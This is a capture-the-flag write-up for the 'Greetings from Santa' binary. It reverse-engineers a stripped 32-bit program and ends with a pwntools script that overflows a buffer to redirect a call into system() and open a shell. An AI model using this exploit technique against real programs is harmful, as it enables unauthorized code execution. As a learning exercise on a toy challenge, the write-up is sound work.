## XMASCTF: Greetings from Santa
##### *tl;dr: buffer overflow to control instruction pointer, call eax*
#### This was an interesting challenge, although I didn't solve any of these challenges during the duration of the CTF, which was around christmas time last year, I'm hosting them locally in hopes of being able to learn new things. We are given only the challenge binary, so first thing to do is to check the properties and security measures:
```
$ file chall 
chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=5c2946ef557ee008fc18faeea0796165b43b8234, stripped

$ checksec chall
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
#### We're dealing with a stripped binary, which means that it's a bit harder to disassemble and reverse engineer compared to non-stripped ones, but nonetheless we can still do it. To disassemble and debug the binary we'll be using gdb and decompile it using ghidra then rename some functions to get a clearer understanding on it. 
```c
uint main(void)

{
  char buffer [64];
  undefined **local_14 [2];
  undefined *local_c;
  
  local_c = &stack0x00000004;
  alarm(0x3c);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14[0] = &PTR_print_name_0804888c;
  printf("Greetings from Santa! Wanna talk? ");
  move_0x08048898();
  fgets(buffer,0x200,stdin);
  if (buffer[0] == 'y') {
    name_vuln(local_14);
  }
  return (uint)(buffer[0] != 'y');
}
```
#### The main function decompilation shows some interesting things, like how the binary is set with alarm and the setvbuf calls, after which prints out the first prompt we get. Afterwards, receives user input and the first character must be a 'y' to proceed to the next function. But we'd like to take a note of the function called after the printf, `move_0x08048898`. Let's take a loot at its assembly code:
```
   0x08048760:	push   ebp
   0x08048761:	mov    ebp,esp
   0x08048763:	sub    esp,0x10
   0x08048766:	mov    eax,0x8048898
   0x0804876b:	mov    DWORD PTR [ebp-0x4],eax
   0x0804876e:	nop
   0x0804876f:	leave  
   0x08048770:	ret    
```
#### We see that what seems to be a function address gets moved to eax register. But what could this be? We'll take a look at that specific address in the disassembled .text segment in gdb.
```
gdb-peda$ telescope 0x8048898
0000| 0x8048898 --> 0x8048772 (push   ebp)
0004| 0x804889c --> 0x8049ed8 --> 0xf7e9a410 (<_ZN10__cxxabiv117__class_type_infoD2Ev>:	push   ebx)
0008| 0x80488a0 --> 0x80488a4 ("7Greeter")
0012| 0x80488a4 ("7Greeter")
0016| 0x80488a8 ("eter")
0020| 0x80488ac --> 0x0 
0024| 0x80488b0 --> 0x8049ed8 --> 0xf7e9a410 (<_ZN10__cxxabiv117__class_type_infoD2Ev>:	push   ebx)
0028| 0x80488b4 --> 0x80488b8 ("15CommandExecutor")
```
#### Interesting, the first 4 bytes from the 0x8048898 seems to be leading to another address somewhere in the code. Let's search for the address again within the disassembled .text segment:
```
   0x08048772:	push   ebp
   0x08048773:	mov    ebp,esp
   0x08048775:	sub    esp,0x8
   0x08048778:	sub    esp,0xc
   0x0804877b:	push   DWORD PTR [ebp+0xc]
   0x0804877e:	call   0x8048500 <system@plt>
   0x08048783:	add    esp,0x10
   0x08048786:	nop
   0x08048787:	leave  
   0x08048788:	ret   
```
#### There's our win function right there! Basically, the `move_0x08048898` function loads an address which points to another address (which is the function that calls system) into the eax register. With that all cleared, let's take a look at the name_vuln function which gets called after we supply our input. Like the main function, it prints out a prompt then gets our user input. But we see something weird in the disassembly:
```
   0x0804874a:	mov    eax,DWORD PTR [eax]
   0x0804874c:	mov    eax,DWORD PTR [eax]
   0x0804874e:	sub    esp,0x8
   0x08048751:	lea    edx,[ebp-0x6c]
   0x08048754:	push   edx
   0x08048755:	push   DWORD PTR [ebp+0x8]
   0x08048758:	call   eax
```
#### It dereferences what is in the eax register twice, and then proceeds to perform a call eax after. That's what we're gonna exploit! We're gonna take advantage of the `move_0x08048898` function, for it to be dereferenced twice, then we'll be able to execute the system function. So what we'll focus on now is controlling the eax register. Fire up gdb, and let's figure out which offset we can control eax with. 
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ r
Greetings from Santa! Wanna talk? yAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
What is your name? ARIES
[...]
Stopped reason: SIGSEGV
0x0804874c in ?? ()

gdb-peda$ x/ $eax
0x64414148:	Cannot access memory at address 0x64414148

gdb-peda$ pattern offset 0x64414148
1681998152 found at offset: 63
```
## Exploitation
#### Now that we have what we need, we move on to the fun parts. So our plan for this exploit is to overflow the buffer till we control eax, but we keep in mind that the first character must be 'y'. After which, we move the address of the `move_0x08048898` function into eax, so it'll get dereferenced twice, cause system executed, enjoy our interactive shell then cat the flag!
##### exploit.py
```python 
from pwn import *

#: Connect to challenge server
p = process('./chall')
print(p.recv())

#: Exploit code
prompt = 'y'
offset = 'A' * 63
eax = p32(0x8048898)
exploit = prompt + offset + eax

#: Send payload
p.sendline(exploit)
print(p.recv())
p.interactive()
```
#### Run the script, then cat flag!
```
$ python exploit.py
Greetings from Santa! Wanna talk? 
What is your name? 
[*] Switching to interactive mode
$ cat flag
X-MAS{6r3371n65_fr0m_5y573m_700}
```

